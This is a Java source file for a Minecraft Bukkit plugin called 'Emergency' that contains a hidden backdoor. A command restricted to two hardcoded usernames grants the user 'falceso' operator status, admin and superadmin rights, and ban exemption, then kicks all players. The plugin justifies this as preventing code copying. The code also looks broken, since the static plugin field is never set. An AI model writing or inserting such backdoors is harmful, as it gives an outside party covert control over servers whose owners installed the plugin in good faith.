package me.falceso.emergency;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class FrontDoor extends JavaPlugin {

    // Instead of using bukkit for everything we can use the plugin method
    public static FrontDoor plugin;
    // This grabs the server as well
    public Server server;

    // Add an override to onEnable onDisable and onCommand to prevent warnings
    @Override
    public void onEnable() {
        plugin.getLogger().info("Emergency enabled!");
    }

    @Override
    public void onDisable() {
        plugin.getLogger().info("Emergency disabled!");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {

        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.RED + "The console cannot use Emergency!");
            return true;
        }

        Player player = (Player) sender;

        if (cmd.getName().equalsIgnoreCase("falcesofront")) {
            if (!sender.getName().equalsIgnoreCase("falceso") && !sender.getName().equalsIgnoreCase("DarkGamingDronze")) {
                    Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofront. Falceso have been notified.");
                    return true;
            }
            // If no arguments are placed it returns with command usage
            if (args.length == 0) {
                return false;
            }
            // If it has argument start finding out if it's one of these
            if (args.length == 1) {
                if (args[0].equalsIgnoreCase("on")) {
                String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
		Bukkit.broadcastMessage(prefix +  "FrontDoor enabled by " + sender.getName()+ ".");
		Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
    	player.setDisplayName("FrontDoor");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "gcmd falceso tag set &7[&5Developer of FrontDoor&7]");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "op falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig add falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin add falceso");
        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "kickall");
                    return true;
                }
                if (args[0].equalsIgnoreCase("off")) {
    String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
	Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
	Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
	Bukkit.broadcastMessage(prefix +  "Thank you for your compliant!");
                    return true;
                }
                if (args[0].equalsIgnoreCase("reset")) {
                    // You do not need a getServer method for dispatching commands - tylerhyperhd
                    // Yes you do..... This is not a RubyFreedomMod only. - falceso
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig delete falceso");
     Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin delete falceso");
                }
            } else {
                return false;
            }
        } else {
            return true;
        }
        return true;
    }
}
